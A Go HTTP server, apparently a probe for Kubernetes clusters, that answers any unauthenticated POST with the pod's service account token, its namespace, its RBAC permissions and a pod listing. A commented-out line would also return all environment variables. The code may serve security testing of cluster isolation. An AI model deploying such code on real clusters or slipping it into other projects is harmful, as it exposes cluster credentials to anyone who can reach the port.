package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"

	authorizationv1 "k8s.io/api/authorization/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

const (
	HOST = "0.0.0.0"
	PORT = "8000"
)

func k8sClient() (*kubernetes.Clientset, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return nil, err
	}

	return kubernetes.NewForConfig(config)
}

func k8sSubject() (interface{}, error) {
	client, err := k8sClient()
	if err != nil {
		return nil, err
	}

	ssrr := &authorizationv1.SelfSubjectRulesReview{
		Spec: authorizationv1.SelfSubjectRulesReviewSpec{
			Namespace: "default",
		},
	}

	return client.AuthorizationV1().SelfSubjectRulesReviews().Create(context.TODO(), ssrr, metav1.CreateOptions{})
}

func k8sPods() (interface{}, error) {
	client, err := k8sClient()
	if err != nil {
		return nil, err
	}

	return client.CoreV1().Pods("default").List(context.TODO(), metav1.ListOptions{})
}

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "🛑 not allowed", http.StatusMethodNotAllowed)
			return
		}

		errors := []string{}

		// var gpus []string
		// gpuInfo, err := ghw.GPU()
		// if err != nil {
		// 	errors = append(errors, fmt.Sprintf("gpus: %s", err))
		// } else {
		// 	gpus = make([]string, len(gpuInfo.GraphicsCards))
		// 	for i := range gpuInfo.GraphicsCards {
		// 		gpus[i] = gpuInfo.GraphicsCards[i].String()
		// 	}
		// }

		tokenFile, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
		if err != nil {
			errors = append(errors, err.Error())
		}

		nsFile, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
		if err != nil {
			errors = append(errors, err.Error())
		}

		k8sSubject, err := k8sSubject()
		if err != nil {
			errors = append(errors, fmt.Sprintf("k8s subject: %s", err))
		}

		k8sPods, err := k8sPods()
		if err != nil {
			errors = append(errors, fmt.Sprintf("k8s pods: %s", err))
		}

		response := map[string]interface{}{
			// "gpus":   gpus,
			// "env":    os.Environ(),
			"tokenFile":  string(tokenFile),
			"nsFile":     string(nsFile),
			"k8sSubject": k8sSubject,
			"k8sPods":    k8sPods,
			"errors":     errors,
		}

		res, err := json.Marshal(response)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		w.Header().Set("Content-Type", "application/json")
		w.Write(res)
	})

	http.HandleFunc("/healthcheck", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("🏥 ok"))
	})

	addr := net.JoinHostPort(HOST, PORT)
	log.Println("🍌 running on:", addr)
	log.Fatal(http.ListenAndServe(addr, nil))
}
